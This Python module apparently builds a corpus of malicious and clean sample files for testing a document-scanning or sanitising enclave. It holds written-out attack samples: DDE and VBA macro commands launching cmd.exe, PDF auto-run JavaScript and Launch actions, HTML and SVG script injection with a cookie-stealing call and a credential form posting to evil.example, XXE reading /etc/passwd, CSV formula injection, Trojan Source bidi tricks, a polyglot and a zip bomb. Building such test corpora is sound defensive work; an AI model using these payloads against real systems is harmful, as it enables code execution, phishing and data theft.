"""Builders for the malicious/benign sample corpus used by the enclave tests."""

import io
import struct
import zipfile
import zlib

EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

_WORD_DOC = (
    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>'
    b"<w:p><w:r><w:t>Quarterly report</w:t></w:r></w:p>"
    b'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r>'
    b'<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    b"</w:body></w:document>"
)


def _zip(files: dict) -> bytes:
    """Deterministic archive (fixed timestamps) so samples and their hashes are reproducible."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, content in files.items():
            info = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            z.writestr(info, content)
    return buf.getvalue()


def docm() -> bytes:
    """Word document with a VBA macro project, a remote template and a DDE field."""
    return _zip({
        "[Content_Types].xml": (
            '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            '<Override PartName="/word/vbaData.xml" ContentType="application/vnd.ms-word.vbaData+xml"/></Types>'
        ),
        "_rels/.rels": (
            '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
        ),
        "word/document.xml": _WORD_DOC,
        "word/_rels/document.xml.rels": (
            '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>'
            '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/template.dotm" TargetMode="External"/>'
            '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/></Relationships>'
        ),
        "word/vbaProject.bin": b"\xd0\xcf\x11\xe0Attribute VB_Name = \"ThisDocument\"\r\nSub AutoOpen()\r\nShell \"cmd /c calc\"\r\nEnd Sub",
        "word/vbaData.xml": '<?xml version="1.0"?><wne:vbaSuppData xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"/>',
    })


def docx_clean() -> bytes:
    return _zip({
        "[Content_Types].xml": (
            '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
        ),
        "_rels/.rels": (
            '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
        ),
        "word/document.xml": (
            '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            "<w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>"
        ),
    })


def xlsm() -> bytes:
    """Excel workbook with an XLM macro sheet and a DDE formula."""
    return _zip({
        "[Content_Types].xml": (
            '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>'
            '<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/></Types>'
        ),
        "_rels/.rels": (
            '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
        ),
        "xl/workbook.xml": '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>',
        "xl/_rels/workbook.xml.rels": (
            '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/>'
            '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>'
        ),
        "xl/macrosheets/sheet1.xml": '<?xml version="1.0"?><xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><f>EXEC("calc.exe")</f></xm:macrosheet>',
        "xl/worksheets/sheet1.xml": (
            '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
            "<row r=\"1\"><c r=\"A1\"><f>cmd|' /c calc'!A0</f></c><c r=\"B1\"><f>SUM(1,2)</f></c></row></sheetData></worksheet>"
        ),
    })


def _pdf(objects: list) -> bytes:
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for i, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode() + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode()
    for off in offsets:
        out += f"{off:010d} 00000 n \n".encode()
    out += f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return bytes(out)


def pdf_javascript() -> bytes:
    return _pdf([
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('pwned')) >> /AA << /WC 4 0 R >> >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] /A << /S /URI /URI (javascript:alert(1)) >> >>] >>",
        b"<< /S /Launch /F (cmd.exe) >>",
    ])


def pdf_clean() -> bytes:
    return _pdf([
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
    ])


def pdf_obfuscated() -> bytes:
    return _pdf([b"<< /Type /Catalog /OpenAction << /S /J#61vaScript /J#53 (app.alert(1)) >> >>"])


def pdf_compressed_js() -> bytes:
    payload = zlib.compress(b"<< /S /JavaScript /JS (app.alert(1)) >>")
    return _pdf([
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Length " + str(len(payload)).encode() + b" /Filter /FlateDecode /Type /ObjStm >>\nstream\n" + payload + b"\nendstream",
    ])


HTML_ATTACK = (
    "<!DOCTYPE html><html><head><title>Invoice</title><script>steal(document.cookie)</script>"
    '<meta http-equiv="refresh" content="0;url=https://evil.example"><style>body{background:url(javascript:alert(1))}</style></head>'
    '<body onload="alert(1)"><h1>Invoice #42</h1><p>Total: <b>$120</b> &lt;not a tag&gt;</p>'
    '<img src="x.png" onerror="alert(2)" alt="logo"><a href="jav&#x09;ascript:alert(3)">click</a>'
    '<a href="https://example.com/pay" target="_blank">pay</a><iframe src="https://evil.example"><p>inside iframe</p></iframe>'
    '<form action="https://evil.example/login"><input name="password" type="password"><button>Sign in</button></form>'
    "</body></html>"
).encode()

SVG_ATTACK = (
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10" onload="alert(1)">'
    "<script>alert(2)</script><rect width=\"10\" height=\"10\" fill=\"red\" onclick=\"alert(3)\"/>"
    '<a xlink:href="javascript:alert(4)"><text x="0" y="5">x</text></a><foreignObject><div>html</div></foreignObject>'
    '<a href="#ok"><circle r="1"/></a></svg>'
).encode()

SVG_XXE = b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&x;</svg>'

CSV_INJECTION = b"name,amount,note\r\nAlice,-120,refund\r\nBob,=HYPERLINK(\"http://evil.example\",\"click\"),ok\r\nEve,@SUM(1+1),+cmd|' /c calc'!A0\r\n"

TROJAN_SOURCE = (
    "access_level = \"user\"\n"
    "if access_level != \"user\u202e \u2066// Check if admin\u2069 \u2066\":\n"
    "    grant()\n"
    "Please log in at p\u0430ypal.com today\u200b.\n"
    "\u041f\u0440\u0438\u0432\u0456\u0442, \u0441\u0432\u0456\u0442\n"
    "Family: \U0001F468\u200d\U0001F469\u200d\U0001F467\n"
).encode("utf-8")


def png_polyglot() -> bytes:
    def chunk(kind, data):
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)

    png = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00\x00")) + chunk(b"IEND", b"")
    return png + _zip({"payload.exe": b"MZ" + b"\x00" * 64})


def png_clean_length() -> int:
    return len(png_polyglot()) - len(_zip({"payload.exe": b"MZ" + b"\x00" * 64}))


def zip_bomb_docx() -> bytes:
    files = {
        "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        "word/bomb.xml": b"\x00" * (8 * 1024 * 1024),
    }
    return _zip(files)


def eicar_txt() -> bytes:
    return EICAR + b"\r\n"


def executable() -> bytes:
    return b"MZ\x90\x00" + b"\x00" * 60 + b"This program cannot be run in DOS mode"


def legacy_doc() -> bytes:
    return b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512


SAMPLES = {
    "invoice.docm": docm,
    "clean.docx": docx_clean,
    "budget.xlsm": xlsm,
    "statement.pdf": pdf_javascript,
    "clean.pdf": pdf_clean,
    "obfuscated.pdf": pdf_obfuscated,
    "hidden.pdf": pdf_compressed_js,
    "invoice.html": lambda: HTML_ATTACK,
    "logo.svg": lambda: SVG_ATTACK,
    "contacts.csv": lambda: CSV_INJECTION,
    "trojan_source.txt": lambda: TROJAN_SOURCE,
    "photo.png": png_polyglot,
    "eicar.txt": eicar_txt,
    "setup.exe.pdf": executable,
    "report.doc": legacy_doc,
    "bomb.docx": zip_bomb_docx,
}
